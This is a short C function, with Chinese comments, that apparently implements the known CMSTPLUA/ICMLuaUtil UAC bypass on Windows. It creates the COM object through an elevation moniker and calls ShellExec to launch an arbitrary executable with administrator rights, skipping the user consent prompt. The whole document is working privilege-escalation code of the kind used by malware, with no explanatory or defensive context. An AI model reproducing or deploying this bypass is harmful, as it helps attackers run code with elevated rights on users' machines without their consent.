BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil *CMLuaUtil = NULL;
	BOOL bRet = FALSE;

	do {
		::CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
		::IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

		// 提权
		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
		if (FAILED(hr))
		{
			break;
		}

		// 启动程序
		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
		if (FAILED(hr))
		{
			break;
		}

		bRet = TRUE;
	}while(FALSE);

	// 释放
	if (CMLuaUtil) 
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	return bRet;
}
